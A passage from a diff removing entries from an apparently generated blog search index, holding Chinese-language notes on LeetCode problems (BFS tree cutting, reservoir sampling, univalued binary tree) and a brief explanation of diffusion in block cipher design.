class="built_in">sum</span>(isPrime)</span><br></pre></td></tr></table></figure>
-<p>例子： <a href="https://leetcode.cn/problems/count-primes/">204. 计数质数</a></p>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>约瑟夫环</title>
-    <url>/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/</url>
-    <content><![CDATA[<h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>参见：</p>
-<p> <a href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></p>
-<h4 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h4>]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LC 5.23 t.675 Cut Off Trees for Golf Event</title>
-    <url>/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/</url>
-    <content><![CDATA[<h4 id="5-23-675-为高尔夫比赛砍树"><a href="#5-23-675-为高尔夫比赛砍树" class="headerlink" title="5.23  675. 为高尔夫比赛砍树"></a>5.23  <a href="https://leetcode.cn/problems/cut-off-trees-for-golf-event/">675. 为高尔夫比赛砍树</a></h4><p>难度：困难</p>
-<p>你被请来给一个要举办高尔夫比赛的树林砍树。树林由一个 <code>m x n</code> 的矩阵表示， 在这个矩阵中：</p>
-<ul>
-<li><code>0</code> 表示障碍，无法触碰</li>
-<li><code>1</code> 表示地面，可以行走</li>
-<li><code>比 1 大的数</code> 表示有树的单元格，可以行走，数值表示树的高度</li>
-</ul>
-<p>每一步，你都可以向上、下、左、右四个方向之一移动一个单位，如果你站的地方有一棵树，那么你可以决定是否要砍倒它。</p>
-<p>你需要按照树的高度从低向高砍掉所有的树，每砍过一颗树，该单元格的值变为 <code>1</code>（即变为地面）。</p>
-<p>你将从 <code>(0, 0)</code> 点开始工作，返回你砍完所有树需要走的最小步数。 如果你无法砍完所有的树，返回 <code>-1</code> 。</p>
-<p>可以保证的是，没有两棵树的高度是相同的，并且你至少需要砍倒一棵树。</p>
-<p><strong>示例 1：</strong></p>
-<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees1.jpg" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,4],[7,6,5]]</span><br><span class="line">输出：6</span><br><span class="line">解释：沿着上面的路径，你可以用 6 步，按从最矮到最高的顺序砍掉这些树。</span><br></pre></td></tr></table></figure>
-<p><strong>示例 2：</strong></p>
-<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees2.jpg" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,0],[7,6,5]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：由于中间一行被障碍阻塞，无法访问最下面一行中的树。</span><br></pre></td></tr></table></figure>
-<p><strong>示例 3：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[2,3,4],[0,0,5],[8,7,6]]</span><br><span class="line">输出：6</span><br><span class="line">解释：可以按与示例 1 相同的路径来砍掉所有的树。</span><br><span class="line">(0,0) 位置的树，可以直接砍去，不用算步数。</span><br></pre></td></tr></table></figure>
-<p><strong>提示：</strong></p>
-<ul>
-<li><code>m == forest.length</code></li>
-<li><code>n == forest[i].length</code></li>
-<li><code>1 &lt;= m, n &lt;= 50</code></li>
-<li><code>0 &lt;= forest[i][j] &lt;= 109</code></li>
-</ul>
-<h5 id="思路1：排序＋广搜"><a href="#思路1：排序＋广搜" class="headerlink" title="思路1：排序＋广搜"></a>思路1：排序＋广搜</h5><blockquote>
-<p>类似 <a href="https://leetcode.cn/problems/pacific-atlantic-water-flow/">417. 太平洋大西洋水流问题</a> 都是四个方向的广搜，但限制条件不同</p>
-<p>先将需要砍掉的树按照树高度排序，需要记录坐标和高度 <code>(index_x,index_y,height)</code>，然后使用广度优先从四个方向搜索，搜索之前建立<code>visit[]</code>数组记录是否搜索过，可以先建立方向列表或直接遍历，原理是 <code>((x+1,y),(x-1,y),(x,y+1),(x,y-1))</code> 将满足限制条件的点再次入队。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutOffTree</span>(<span class="params">self, forest: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#广度优先搜素</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">sx,sy,tx,ty</span>):</span><br><span class="line">            row = <span class="built_in">len</span>(forest)</span><br><span class="line">            col = <span class="built_in">len</span>(forest[<span class="number">0</span>])</span><br><span class="line">            queue = deque([(<span class="number">0</span>,sx,sy)])</span><br><span class="line">            visit = &#123;(sx,sy)&#125;</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                distance,x,y = queue.popleft()</span><br><span class="line">                <span class="keyword">if</span> x == tx <span class="keyword">and</span> y == ty:</span><br><span class="line">                    <span class="keyword">return</span> distance</span><br><span class="line">                <span class="keyword">for</span> nx,ny <span class="keyword">in</span> ((x+<span class="number">1</span>,y),(x-<span class="number">1</span>,y),(x,y+<span class="number">1</span>),(x,y-<span class="number">1</span>)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span>&lt;=nx&lt;row <span class="keyword">and</span> <span class="number">0</span>&lt;=ny&lt;col <span class="keyword">and</span> forest[nx][ny] <span class="keyword">and</span> (nx,ny) <span class="keyword">not</span> <span class="keyword">in</span> visit:</span><br><span class="line">                        visit.add((nx,ny))</span><br><span class="line">                        queue.append((distance+<span class="number">1</span>,nx,ny))</span><br><span class="line">                    <span class="comment">#print(&quot;queue:&quot;,queue)</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按照树的高度排序(indx_x,indx_y,height)</span></span><br><span class="line">        sort_trees = []</span><br><span class="line">        <span class="keyword">for</span> row,tree <span class="keyword">in</span> <span class="built_in">enumerate</span>(forest):</span><br><span class="line">            <span class="keyword">for</span> col,h <span class="keyword">in</span> <span class="built_in">enumerate</span>(tree):</span><br><span class="line">                <span class="keyword">if</span> h &gt; <span class="number">1</span>:</span><br><span class="line">                    sort_trees.append((row,col,h))</span><br><span class="line">        sort_trees = <span class="built_in">sorted</span>(sort_trees,key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(sort_trees)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        res = pre_x = pre_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y,h <span class="keyword">in</span> sort_trees:</span><br><span class="line">            d = bfs(pre_x,pre_y,x,y)</span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            res += d</span><br><span class="line">            pre_x,pre_y = x,y</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
-<h5 id="矩阵类-BFS-的-demo"><a href="#矩阵类-BFS-的-demo" class="headerlink" title="矩阵类 BFS 的 demo"></a>矩阵类 BFS 的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">sorce_val,target_val</span>):</span><br><span class="line">    row = <span class="built_in">len</span>(Matrix)</span><br><span class="line">    col = <span class="built_in">len</span>(Matrix[<span class="number">0</span>])</span><br><span class="line">    queue = deque([(need_val,indexs)])</span><br><span class="line">    visit = &#123;(pointer_index)&#125;</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        <span class="comment">#Limit the values stored in the queue based on conditions</span></span><br><span class="line">        need_val,indexs = queue.popleft()	</span><br><span class="line">        <span class="keyword">if</span> get_the_target_pointer:</span><br><span class="line">            <span class="comment">#conditions of return</span></span><br><span class="line">            <span class="keyword">return</span> need_val	</span><br><span class="line">        <span class="keyword">for</span> next_pointer <span class="keyword">in</span> all_directions:</span><br><span class="line">        <span class="comment">#eg: for nx,ny in ((x+1,y),(x-1,y),(x,y+1),(x,y-1)):</span></span><br><span class="line">        	<span class="comment">#search in all directions</span></span><br><span class="line">            <span class="keyword">if</span> fulfillment_of_conditions:</span><br><span class="line">            <span class="comment">#eg: if 0&lt;=nx&lt;row and 0&lt;=ny&lt;col and forest[nx][ny] and (nx,ny) not in visit:</span></span><br><span class="line">            	<span class="comment">#**Judgment Conditions**</span></span><br><span class="line">                visit.add((next_pointer))</span><br><span class="line">                queue.append((changed_need_val,indexs))</span><br><span class="line">    <span class="keyword">return</span> situation_of_ERR_or_boundary</span><br></pre></td></tr></table></figure>
-<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>还可以用 Dijkstra 和 A*启发式算法求解，待续…</p>
-]]></content>
-      <categories>
-        <category>LeetCode_daily</category>
-      </categories>
-      <tags>
-        <tag>BFS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蓄水池采样</title>
-    <url>/2022/05/25/Algorithm/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="蓄水池采样算法-Reservoir-Sampling"><a href="#蓄水池采样算法-Reservoir-Sampling" class="headerlink" title="蓄水池采样算法 (Reservoir Sampling)"></a>蓄水池采样算法 (Reservoir Sampling)</h1><p><a href="https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1</a></p>
-<p>假设有一个蓄水池，蓄水池里不断加水，问如何在每一时刻都能以相同概率采样到数据？当然还可能有很多别的理解方式，但都要求在数据量变化的情况下使得抽样的概率相等。</p>
-<p>具体例子：<a href="https://leetcode-cn.com/problems/random-pick-index/">398. 随机数索引</a></p>
-<p>当然，存在很多现有的函数能够实现随机采样，但归其根源，考虑用概率解决：</p>
-<h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>假设数据序列的规模为 $n$，需要采样的数量的为 $k$。</p>
-<p>首先构建一个可容纳 $k$ 个元素的数组，将序列的前 $k$ 个元素放入数组中。</p>
-<p>然后从第 $k+1$ 个元素开始，以 $k_n$ 的概率来决定该元素是否被替换到数组中（数组中的元素被替换的概率是相同的）。 当遍历完所有元素之后，数组中剩下的元素即为所需采取的样本。</p>
-<h2 id="证明过程"><a href="#证明过程" class="headerlink" title="证明过程"></a>证明过程</h2><p>也可以抽取的样本是 $1$，概率就变成 $\frac{1}{n}$ ，如下：</p>
-<p>当只有一个数据时，采样到的概率为 $1$ ；</p>
-<p>加入一个数据时，取到它的概率为 $\frac{1}{2}$，那么，取到第一个数据的概率也为  $\frac{1}{2}$；</p>
-<p>再加入一个数据，取到它的概率为 $\frac{1}{3}$，取到前两个数据的概率就应该发生变化，为 之前的概率*本次未被选中的概率，即$\frac{1}{2}\times(1-\frac{1}{3})=\frac{1}{3}$；</p>
-<p>以此类推…</p>
-<p>对于抽样 $k$ 个数据集：</p>
-<p>对于第 $i$ 个数$（i≤ki≤k）$。在 $k$ 步之前，被选中的概率为 $1$。当走到第 $k+1$ 步时，被第 $k+1$ 个元素构成的新集合替换的概率 = $k+1$ 个元素中选中前 $k$ 个的概率 <em> 前 $k$ 个中选一个替换的概率，即为 $\frac{k}{k+1}</em>\frac{1}{k}=\frac{1}{k+1}$。则被保留的概率为 $1-\frac{1}{k+1}=\frac{k}{k+1}$。以此类推，则运行到第 $n$ 步时，被保留的概率 = 被选中的概率 * 不被替换的概率，即：</p>
-<script type="math/tex; mode=display">
-1\times\frac{k}{k+1}\times\frac{k+1}{k+2}\times...\times\frac{n-1}{n}=\frac{k}{n}\\
-or\\
-\frac{n-1}{n}\times\frac{n-2}{n-1}\times...\times\frac{k}{k+1}\times1=\frac{k}{n}</script><p>这是符合要求的。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = 0</span><br><span class="line">s = NULL</span><br><span class="line">for line in lines:</span><br><span class="line">	i = i + 1</span><br><span class="line">	r = random.choice(0,1)</span><br><span class="line">	if r &lt; 1/i:</span><br><span class="line">		s = line #替换</span><br></pre></td></tr></table></figure>
-<h2 id="关于为什么替换"><a href="#关于为什么替换" class="headerlink" title="关于为什么替换"></a>关于为什么替换</h2><p>替换就是采样，不断地替换或者不替换表示当前是否采样到该数据；</p>
-<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h4 id="398-Random-Pick-Index"><a href="#398-Random-Pick-Index" class="headerlink" title="398. Random Pick Index"></a><a href="https://leetcode.cn/problems/random-pick-index/">398. Random Pick Index</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.position = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i,num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.position[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        #print(self.position)</span></span><br><span class="line"><span class="string">        #print(choice(self.position[target]))</span></span><br><span class="line"><span class="string">        return choice(self.position[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方解答1</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.pos = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i, num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.pos[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        return choice(self.pos[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方题解2 蓄水池采样</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.nums = nums</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        ans = cnt = 0</span></span><br><span class="line"><span class="string">        for i, num in enumerate(self.nums):</span></span><br><span class="line"><span class="string">            if num == target:</span></span><br><span class="line"><span class="string">                cnt += 1  # 第 cnt 次遇到 target</span></span><br><span class="line"><span class="string">                if randrange(cnt) == 0:</span></span><br><span class="line"><span class="string">                    ans = i</span></span><br><span class="line"><span class="string">            #print(&quot;ans=&quot;,ans,&quot;cnt=&quot;,cnt)</span></span><br><span class="line"><span class="string">        return ans</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">        self.nums = nums</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = indx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.nums):</span><br><span class="line">            <span class="keyword">if</span> num == target:</span><br><span class="line">                <span class="comment">#用 cnt 记录，表示从 (0,cnt) 中随机抽取一个数</span></span><br><span class="line">                <span class="comment">#用来均衡概率，使抽到的概率每次都为 1/（targe的数量)</span></span><br><span class="line">                indx += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> randrange(indx) == <span class="number">0</span>:</span><br><span class="line">                    <span class="comment">#print(randrange(indx))</span></span><br><span class="line">                    res = i</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(nums)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick(target)</span></span><br></pre></td></tr></table></figure>
-<h4 id="497-Random-Point-in-Non-overlapping-Rectangles"><a href="#497-Random-Point-in-Non-overlapping-Rectangles" class="headerlink" title="497. Random Point in Non-overlapping Rectangles"></a><a href="https://leetcode.cn/problems/random-point-in-non-overlapping-rectangles/">497. Random Point in Non-overlapping Rectangles</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rects: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">        self.rectangle = rects</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        SumPoints = <span class="number">0</span></span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,(x1,y1,x2,y2) <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.rectangle):</span><br><span class="line">            curPoints = (x2-x1+<span class="number">1</span>) * (y2-y1+<span class="number">1</span>)    <span class="comment">#当前矩形包含的点数</span></span><br><span class="line">            SumPoints += curPoints  <span class="comment">#总点数</span></span><br><span class="line">            <span class="keyword">if</span> random.randint(<span class="number">0</span>,SumPoints) &lt; curPoints:</span><br><span class="line">                <span class="comment">#这个判断的依据</span></span><br><span class="line">                <span class="comment">#如：第一次加 curSum=9,第二次加 curSum=9+12=21</span></span><br><span class="line">                <span class="comment">#第 1 次采样一定取第 1 个矩形</span></span><br><span class="line">                <span class="comment">#第 2 次采样，取到小于 12 取第 2 个矩形，12~21 取第 1 个矩形（未变）</span></span><br><span class="line">                <span class="comment">#试下等概率采样</span></span><br><span class="line">                idx = i</span><br><span class="line">        x1,y1,x2,y2 = self.rectangle[idx]</span><br><span class="line">        <span class="keyword">return</span> [x1+random.randint(<span class="number">0</span>,x2-x1),y1+random.randint(<span class="number">0</span>,y2-y1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(rects)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick()</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LC 5.24 t.965. Univalued Binary Tree</title>
-    <url>/2022/05/25/Lc_daily/LC-5.24-t.965.-Univalued-Binary-Tree/</url>
-    <content><![CDATA[<h4 id="965-单值二叉树"><a href="#965-单值二叉树" class="headerlink" title="965. 单值二叉树"></a><a href="https://leetcode.cn/problems/univalued-binary-tree/">965. 单值二叉树</a></h4><p>难度：简单</p>
-<p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
-<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
-<p><strong>示例 1：</strong></p>
-<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50104-pm.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1,1,1,null,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
-<p><strong>示例 2：</strong></p>
-<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50050-pm.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[2,2,2,5,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
-<p><strong>提示：</strong></p>
-<ol>
-<li>给定树的节点数范围是 <code>[1, 100]</code>。</li>
-<li>每个节点的值都是整数，范围为 <code>[0, 99]</code> 。</li>
-</ol>
-<h5 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h5><ol>
-<li><p>深度优先，在判断到不等值时返回 False，一直相等，到遍历完返回 True</p>
-</li>
-<li><p>使用集合，无论采取哪种遍历方式，将所有值加入集合，并在最后判断集合的长度是否为 1 即可</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isUnivalTree</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#3 traverse</span></span><br><span class="line">        ttval = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            ttval.add(root.val)</span><br><span class="line">            preorder(root.left)</span><br><span class="line">            preorder(root.right)</span><br><span class="line"></span><br><span class="line">        preorder(root)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(ttval) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        #DFS</span></span><br><span class="line"><span class="string">        if not root:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        if root.left:</span></span><br><span class="line"><span class="string">            if root.val != root.left.val or not self.isUnivalTree(root.left):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        if root.right:</span></span><br><span class="line"><span class="string">            if root.val != root.right.val or not self.isUnivalTree(root.right):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        return True</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-<h5 id="前中后序遍历的-demo"><a href="#前中后序遍历的-demo" class="headerlink" title="前中后序遍历的 demo"></a>前中后序遍历的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#preorder(root)</span></span><br><span class="line">    order(root.left)</span><br><span class="line">    <span class="comment">#inorder(root)</span></span><br><span class="line">    order(root.right)</span><br><span class="line">    <span class="comment">#postorder(root)</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>LeetCode_daily</category>
-      </categories>
-      <tags>
-        <tag>DFS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Diffusion Basic</title>
-    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
-    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
-<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
-<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
-<p>在研究扩散性时，如果往其最基本单元考虑：</p>
-<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
-<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
-<blockquote>
-<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
-</blockquote>
-<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
-<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
-]]></content>
       <tags>
         <tag>Crypto</tag>
       </tags>
